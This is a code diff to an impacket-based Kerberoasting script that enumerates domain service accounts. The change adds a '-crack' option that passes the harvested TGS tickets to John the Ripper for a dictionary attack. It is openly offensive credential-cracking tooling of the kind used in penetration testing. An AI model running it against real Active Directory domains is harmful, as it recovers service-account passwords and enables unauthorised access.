@@ -18,6 +18,7 @@ import logging
 import sqlite3
 from datetime import datetime
 from binascii import hexlify, unhexlify
+import subprocess
 
 from pyasn1.codec.der import decoder
 from impacket import version
@@ -433,6 +434,7 @@ if __name__ == "__main__":
                         '(128 or 256 bits)')
     parser.add_argument('-domainsfile', help='File with domains (FQDN) per line to test')
     parser.add_argument('-dbfile', help='File to store state in sqlite3 db')
+    parser.add_argument('-crack', action='store', metavar = "wordlist", help='Automatically attempt to crack the TGS service ticket(s) using a dictionairy attack with the provided wordlist')
     parser.add_argument('-outputfile', action='store', help='Output file to write new SPNs to. A date and timestamp will be appended to the filename.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -509,6 +511,9 @@ if __name__ == "__main__":
             logging.info(" ** Finished enumerating domain: "+targetDomain)
             logging.info(" ** Results written to: "+options.outputfile)
 
+        if options.crack is not None:
+            print("Starting to crack using wordlist: "+options.crack)
+            subprocess.run(["john","--format:krb5tgs",options.outputfile,"--wordlist="+options.crack]).stdout
 
     except Exception as e:
         import traceback
